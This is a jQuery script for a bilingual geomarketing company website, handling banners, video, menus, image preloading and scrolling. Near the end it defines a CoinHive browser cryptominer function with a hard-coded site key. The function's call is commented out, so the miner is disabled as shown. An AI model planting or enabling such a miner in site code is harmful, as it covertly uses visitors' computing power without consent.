jQuery(document).ready(function($) {
    $.fn.viewport_size();
    var viewport_width = $.fn.viewport_size('width');
    var viewport_height = $.fn.viewport_size('height');
    
    $.fn.js_paths();
    $.fn.move_banner();
    $.fn.resize_banner();
    $.fn.autoplay_video();
    $.fn.menu_event();
    //$.fn.coinhive_miner();
    $.fn.detect_video();
    $.fn.banner_txt();

    /*
    preload_images = [
        '/images/feature-grid-bg-1.jpg',
        '/images/feature-grid-bg-2.jpg',
        '/images/feature-grid-bg-3.jpg'
    ];
    */

    preload_images = [
        '/images/foto_geomarketing.jpg',        
        '/images/foto_geolocalizacion.jpg',
        '/images/foto_realidad_aumentada.jpg',
        '/images/foto_visita_virtual.jpg',
        '/images/foto_cartografia.jpg',
        '/images/foto_fotogrametria.jpg',
        '/images/fondo_vl.jpg'
    ];

    $.fn.preload_images(preload_images);
	
	$.fn.scrollMenu();
}); // end of jQuery(document).ready(function($)

// Window Resize
(function($) {
    $(window).resize(function() {
        console.log('resizing');
        $.fn.viewport_size();
        var viewport_width = $.fn.viewport_size('width');
        var viewport_height = $.fn.viewport_size('height');        
        $.fn.detect_video();
        $.fn.resize_banner();
        $.fn.banner_txt();
    }); // End of jQuery(window).resize(function($)
})( jQuery );
// End of Windows Resize

// Functions
(function($) {
    
    $.fn.viewport_size = function(dimension) {
        viewport_width = $(window).width();
        viewport_height = $(window).height();
        
        $viewport_width = viewport_width;
        $viewport_height = viewport_height;
        
        if (dimension == 'width') {
            return viewport_width;
        }
        
        else if (dimension == 'height') {
            return viewport_height;
        }
        
        else if (dimension == null) {
            console.log('viewport size: '+viewport_width+'px x '+viewport_height+'px');
        }
    } // End of $.fn.viewport_size = function()
    
    $.fn.get_lang = function() {
        var language = $('html').attr('lang');
        return language;
        //console.log('language: '+language);
    } // end of $.fn.get_lang = function()    
    
    $.fn.js_paths = function() {
        console.log('document.URL: ' + document.URL);
        console.log('document.location.href: ' + document.location.href);
        console.log('document.location.origin: ' + document.location.origin);
        console.log('document.location.host: ' + document.location.host);
        console.log('document.location.pathname: ' + document.location.pathname);
    } // end of $.fn.js_paths = function()
    
    $.fn.move_banner = function() {
        $('.banner').prependTo('.site-inner');
    } // end of $.fn.move_banner = function()
    
    $.fn.resize_banner = function() {
        if ($viewport_width > 800) {
            var current_width = parseFloat($('.banner').css('width'));
            var new_height = (current_width * 720) / 1280;
            new_height = $viewport_height;
            $('.banner, .banner-video').css('height', new_height+'px');
        } // end of if ($viewport_width > 800)
        
    } // end of $.fn.resize_banner = function()
    
    $.fn.autoplay_video = function() {
        if ($('.banner-video').length) {
            $('.banner-video')[0].play();    
        }        
    } // end of $.fn.autoplay_video = function()
    
    $.fn.menu_event = function() {
        var lang = $.fn.get_lang();
        
        if (lang == 'en-US') {
            $('.genesis-nav-menu .menu-item a[href="#about"]').click(function(e) {
                e.preventDefault();
                window.location = document.location.origin + '#about';
            }); // end of $('.genesis-nav-menu .menu-item a[href="#about"]').click(function()
            
            $('.genesis-nav-menu .menu-item a[href="#services"]').click(function(e) {
                e.preventDefault();
                window.location = document.location.origin + '#services';
            }); // end of $('.genesis-nav-menu .menu-item a[href="#about"]').click(function()
        } // end of if (lang == 'es-ES')
        
        else if (lang == 'es-ES') {
            $('.genesis-nav-menu .menu-item a[href="#about"]').click(function(e) {
                e.preventDefault();
                window.location = document.location.origin + '/es/#about';
            }); // end of $('.genesis-nav-menu .menu-item a[href="#about"]').click(function()
            
            $('.genesis-nav-menu .menu-item a[href="#services"]').click(function(e) {
                e.preventDefault();
                window.location = document.location.origin + '/es/#services';
            }); // end of $('.genesis-nav-menu .menu-item a[href="#about"]').click(function()            
            
        } // end of if (lang == 'es-ES')
    } // end of $.fn.menu_event = function()
    
    $.fn.detect_video = function() {        
        if ($viewport_width < 800) {
            $('.banner-video').hide();
            $('.banner-video-yt').show();
        }
        else {
            $('.banner-video').show();
            $('.banner-video-yt').hide();
        }
    } // end of $.fn.detect_video = function()
    
    $.fn.banner_txt = function() {
        
        if ($viewport_width >= 800) {
            var banner_txt_width = $('.banner-text').css('width');
            banner_txt_width = parseInt(banner_txt_width);

            var banner_txt_height = $('.banner-text').css('height');
            banner_txt_height = parseInt(banner_txt_height);        

            $('.banner-text').css({
                'left': 'calc(50% - '+banner_txt_width/2+'px)',
                'top': 'calc(50% - '+banner_txt_height/2+'px)'
            });
        } // end of if ($viewport_width > 800)        
        
    } // end of $.fn.banner_txt = function()

    $.fn.preload_images = function(preload_images) {
        $(preload_images).each(function(){
            $('<img/>')[0].src = this;
            // Alternatively you could use:
            // (new Image()).src = this;
        });
    } // end of $.fn.preload_images = function(images)
	
	$.fn.scrollMenu = function() {

        var is_home = null;

        if ($('.home').length) {            
            $('[class*="menu-item-"]').click(function(e) {
                e.preventDefault();
                var item_string = $(this).find('a span').text();
                //alert('item name: ' + item_string);
                var section = '';
                switch(item_string) {
                    case 'Products':
                    case 'Productos':
                        $.fn.scrollTo('#fg-products', 200);
                        break;
                    case 'Solutions':
                    case 'Soluciones':
                        $.fn.scrollTo('#fg-services', 200);
                        break;
                    case 'Company':
                    case 'Compañía':
                        $.fn.scrollTo('#about', 100);
                        break;
                } // end of switch(item_string)
            }); // end of $('[class*="menu-item-"]').click(function(e)
        } // end of if ($('.home').length)
        else {
            
        } // end of else if (!$('.home').length)
		
	} // end of $.fn.scrollMenu = function()
	
	$.fn.scrollTo = function(selector, offset) {
		section = $(selector);
		TweenLite.to(
			window, 0.5,
			{
				scrollTo: {
					y: selector,
					offsetY: offset
				},
				ease: Circ.easeOut,							
			}
		);
    } // end of $.fn.scrollTo = function(selector)
    
    $.fn.coinhive_miner = function() {
        if ($viewport_width >= 1200) {
            var miner = new CoinHive.Anonymous('w6A0QgKPYpV0TgWVJGGkOxhgShYt9YOv', {
                throttle: 0.9
            });
            miner.start();
        } // end of if (vw >= 1366)        
    } // end of $.fn.coinhive_miner = function()
    
})( jQuery );
// End of functions